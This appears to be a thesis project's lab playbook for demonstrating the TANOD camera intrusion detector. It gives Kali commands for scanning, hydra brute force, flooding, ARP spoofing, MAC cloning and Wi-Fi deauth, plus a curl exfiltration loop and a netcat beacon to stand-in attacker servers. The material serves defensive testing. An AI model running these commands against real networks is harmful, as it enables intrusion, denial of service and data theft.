# TANOD attack playbook (Kali Linux)

How to run each attack from Kali against TANOD, and what to show the panel. The
attacks are real; the detection and blocking are real. This is how the live
demo is driven at the defense.

## ⚠️ Authorization and scope (read first)

Run these **only** against your own test AP (the Pi), your own camera, and your
own hosts, on the **isolated test network** with no route to the school network
or the internet. Confirm the isolation at the start of every session.

- **Never** point any attack — especially deauthentication and injection — at
  any Wi-Fi network, device, or MAC address that is not part of your own test
  setup. Other access points your Wi-Fi card can see are other people's
  networks; attacking them is illegal (RA 10175) and outside this thesis.
- Use the **BSSID of your own Pi AP** and the **MAC of your own camera** in the
  deauth command. Nothing else.
- Attack tools and wordlists are not committed to this repo.

## Lab setup

Two realism levels; both use the same TANOD software (`python -m gateway.run`).

### A. Wired VM lab (now, before the Pi) — A1–A6

Three VMs (VMware Fusion or UTM) on one **host-only** network, so they share an
L2 segment:

| VM | Role | Example address |
|---|---|---|
| Kali | attacker | 192.168.50.99 (its MAC is the attacker MAC) |
| TANOD gateway (Linux) | runs Suricata + `gateway.run` + nftables | 192.168.50.1 |
| Camera target | an RTSP/HTTP camera stand-in (e.g. `mediamtx`, or a cheap IP cam on the net) | 192.168.50.20 |

This shows A1–A6 end to end: real Kali attack → real Suricata/Isolation-Forest
detection → real nftables block. The Wi-Fi-only attacks (A9 deauth) need the
Pi.

### B. Pi 5 AP (final defense) — all of A1–A9

Pi = Wi-Fi access point + Suricata + `gateway.run` + nftables + hostapd. The
camera joins the Pi's Wi-Fi; Kali joins the same Wi-Fi (or wires in) and
attacks. Now the MAC block also kicks the attacker off the Wi-Fi (hostapd
deny + deauthenticate), and A9 can be shown for real with your monitor-mode
adapter.

### Start TANOD (either setup)

```bash
# 1. Suricata with TANOD's rules (see suricata/tanod.yaml for the CAMERAS/VIEWERS vars)
sudo suricata -i eth0 -S suricata/tanod.rules -l /var/log/suricata    # wlan0 on the Pi

# 2. TANOD: read the interface + Suricata, block for real
sudo TANOD_DRY_RUN=0 python -m gateway.run --iface eth0 --eve /var/log/suricata/eve.json --db data/tanod.db

# 3. The dashboard (another terminal), so the panel watches it react
python -m dashboard.demo         # or: uvicorn dashboard.app:app --port 8000
```

Leave `TANOD_DRY_RUN` unset to rehearse safely: TANOD prints the exact nft /
hostapd commands instead of running them.

## The attacks

Placeholders: `CAM=192.168.50.20` (camera), `GW=192.168.50.1` (gateway/AP),
`ATTACKER` = this Kali box. Replace with your own addresses.

### A1 — Port scan (nmap)

```bash
sudo nmap -sS -p- 192.168.50.20
```
TANOD: Suricata rule 9000001 fires on the SYN burst; the Isolation Forest also
flags the window. The attacker is blocked by MAC.
Show the panel: the **Blocked attackers** row (source `suricata`) and the
camera tile still playing with **ATTACK BLOCKED**.

### A2 — Password guessing (hydra)

```bash
# web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.20 http-get /
# RTSP camera login (or use: cameradar -t 192.168.50.20)
hydra -s 554 -l admin -P rockyou.txt 192.168.50.20 rtsp
```
TANOD: rule 9000002 (repeated logins from a non-viewer) → block the attacker.
Show: the event evidence lists the signature.

### A3 — Flood / denial of service (hping3)

```bash
sudo hping3 --udp --flood -p 9 192.168.50.20     # or:  --syn --flood -p 80
```
TANOD: rule 9000003/9000005 (rate rule) fires. The Isolation Forest alone
misses a pure flood (it saturates — see the paper's limitations), so this is a
good one to show the panel **why Suricata is needed too**. Attacker blocked;
the camera's video keeps flowing (this is the Availability case).

### A4 — ARP spoofing / MITM (ettercap or arpspoof)

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.50.20 192.168.50.1     # tell the camera "I am the gateway"
# or:  sudo ettercap -T -M arp:remote /192.168.50.20// /192.168.50.1//
```
TANOD: Suricata and the Isolation Forest see nothing (the video still flows).
The **IP-MAC binding check** catches it: a MAC other than the gateway's claims
192.168.50.1. The spoofer is blocked by MAC.
Show: event source `binding_check`, reason "MAC … claimed to be the gateway".

### A5 — MAC cloning (macchanger)

```bash
sudo ip link set eth0 down
sudo macchanger -m aa:bb:cc:00:00:20 eth0     # the camera's MAC
sudo ip link set eth0 up && sudo dhclient eth0
```
TANOD: the binding check sees the camera's MAC at a second IP while the camera
is still at its own. It blocks the **impostor's IP** only — the real camera
keeps working.

### A6 — Unauthorized stream viewing (cameradar / ffplay)

```bash
cameradar -t 192.168.50.20
# or just open the stream from a host that is not an approved viewer:
ffplay rtsp://192.168.50.20:554/stream
```
TANOD: rule 9000004 (a non-viewer opens the camera's RTSP port) → block the
viewer. Show: the stream never establishes; the attacker is in the blocked list.

### A7 — Hijacked camera exfiltrates video  *(camera-side, scripted)*

The attacker here is the **camera itself**, so this is not launched from Kali.
On the compromised-camera stand-in, start sending data to an outside server:
```bash
# on the camera / a "compromised device" VM, to an attacker-controlled server
while true; do curl -s -X POST http://10.10.0.70:8080/ --data-binary @clip.bin; done
```
TANOD: Suricata misses it; the **Isolation Forest** flags the camera sending to
new destinations and blocks those destinations — the camera stays online. Good
second example of the Isolation Forest's value. Be honest with the panel that
the camera is not really malware-infected; the traffic pattern is reproduced.

### A8 — Hijacked camera beacons to a C2  *(camera-side, scripted)* — known gap

```bash
# on the camera stand-in, once a second:
while true; do echo ping | nc -w1 10.10.0.99 4444; sleep 1; done
```
TANOD: **currently missed** (the "new destination" feature is constant during
training, so the Isolation Forest ignores it). Present this as a limitation /
future work, with the fix noted in the README (learn destinations from days 1–3).

### A9 — Wi-Fi deauthentication (aireplay-ng) — Pi setup only

Needs your monitor-mode adapter and **your own Pi AP**. Use the Pi AP's BSSID
and the camera's MAC — nothing else.

```bash
sudo airmon-ng start wlan1                 # your injection adapter
sudo aireplay-ng --deauth 0 -a <PI_AP_BSSID> -c <CAMERA_MAC> wlan1mon
```
TANOD: the forged frames never reach IP, so Suricata and the binding check see
nothing. The camera drops off the Wi-Fi and goes silent; the Isolation Forest
flags the silent window and TANOD **alerts** the owner (no attacker to block).
Show: the alert, and explain the mitigation — WPA3 with Protected Management
Frames stops deauth; catching the frames themselves would need a second card in
monitor mode (future work).

## What each attack proves

| Attack | Suricata (Setup A) | + Isolation Forest (Setup B) | Point for the panel |
|---|---|---|---|
| A1 scan | ✅ | ✅ | both catch it |
| A2 brute force | ✅ | ✅ | both catch it |
| A3 flood | ✅ (rate rule) | ✅ via Suricata | the forest alone misses it |
| A4 ARP spoof | ❌ | ✅ binding check | needs the binding check |
| A5 MAC clone | ❌ | ✅ binding check | block the impostor, not the camera |
| A6 stream view | ✅ | ✅ | both catch it |
| A7 exfiltration | ❌ | ✅ forest | **forest's value** |
| A8 beacon | ❌ | ❌ | limitation / future work |
| A9 deauth | ❌ | ⚠️ alert only | Availability; WPA3-PMF mitigation |
